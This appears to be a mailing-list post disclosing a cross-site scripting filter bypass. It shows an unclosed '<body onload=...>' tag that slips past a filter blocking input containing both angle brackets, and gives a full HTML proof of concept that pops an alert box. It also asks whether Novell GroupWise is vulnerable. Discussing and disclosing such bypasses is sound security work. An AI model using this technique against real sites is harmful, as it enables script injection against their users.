I found a similar hole in a piece of proprietary software that we use 
at work (advisory pending, the vendor is trying to push patches to 
other users).

Basically, the software filtered all input that had both a < and a > 
(but not just a <).    So I injected:

<body onload="alert('Security hole.')"

This resulted in a dialog box that said "Security hole." WITHOUT any 
script tags (or indeed, without any well-formed HTML at all!).

I would be interested to hear whether or not Novell GroupWise filters 
things like the above example.

Here's a full HTML file that, if loaded in Safari or Firefox, will 
produce a dialog box:

--start--

<html><body>
Here is some text.

<!-- injected characters -->
<body onload="alert('Security hole!')"
<!-- end injected characters -->

<i>Blah blah blah</i>
</body>
</html>

--end--
